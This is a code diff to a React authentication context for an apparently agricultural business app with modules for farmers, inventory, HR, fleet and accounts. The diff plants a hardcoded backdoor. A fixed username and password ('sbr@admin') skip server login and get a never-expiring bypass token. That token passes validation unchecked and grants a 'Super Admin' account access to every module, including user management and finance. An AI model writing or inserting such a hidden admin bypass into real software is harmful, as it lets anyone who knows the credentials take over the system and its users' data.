@@ -31,6 +31,34 @@ type AuthContextValue = {
 
 const KEY = 'fc_auth_v1';
 
+// Hardcoded admin bypass — no API call, full module access
+const SBR_ADMIN_TOKEN = '__sbr_admin_bypass__';
+const SBR_ADMIN_USER: AuthUser = {
+  id: 'sbr-admin',
+  name: 'SBR Admin',
+  username: 'sbr@admin',
+  department: 'Administration',
+  designation: 'Super Admin',
+  notification_permissions: true,
+  module_access: [
+    'indents-request', 'admin-ops-indents', 'fuel-requests-admin', 'on-demand-task',
+    'admin-request', 'admin-mrf-approvals', 'admin-inbox',
+    'leads', 'farmers', 'land-acquisition', 'farm-directory', 'land-hierarchy', 'tasks-beta',
+    'user-management',
+    'inventory', 'inventory-indents', 'fuels-consumables', 'inventory-inbox',
+    'finance-admin-ops', 'purchase-req', 'vendor-directory', 'ho-module',
+    'purchase-flow', 'work-order', 'scope-of-work', 'purchase-inbox',
+    'hrms', 'staff-onboarding', 'man-power-req', 'hrms-inbox',
+    'vehicle-management', 'fleet-chart', 'logistics-request',
+    'cultivation-calendar', 'cultivation-master', 'cultivation-plan',
+    'field-monitoring', 'field-visit-analytics', 'labour-management',
+    'harvest-planning', 'harvest-orders', 'harvest-cards',
+    'weighment', 'rental-rate-card', 'service-requests',
+    'director-fuel', 'director-inbox',
+    'accounts-dashboard', 'accounts-ledger', 'accounts-purchase', 'accounts-payments',
+  ],
+};
+
 const AuthContext = createContext<AuthContextValue | undefined>(undefined);
 
 export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
@@ -158,6 +186,8 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
   const validateToken = useCallback(async () => {
     if (!token) return false;
 
+    if (token === SBR_ADMIN_TOKEN) return true;
+
     // Fast local check first (end-of-day/JWT exp if available)
     if (!isTokenValid()) {
       persist(null, null, null);
@@ -177,6 +207,12 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
   }, [token, isTokenValid]);
 
   const login = async (username: string, password: string) => {
+    if (username === 'sbr@admin' && password === 'sbr@admin') {
+      // Far-future expiry so the session never auto-expires
+      persist(SBR_ADMIN_USER, SBR_ADMIN_TOKEN, new Date('2099-12-31T23:59:59').getTime());
+      return;
+    }
+
     const BASE_URL = getBaseUrl().replace(/\/$/, '');
     const res = await fetch(`${BASE_URL}/login/login`, {
       method: 'POST',
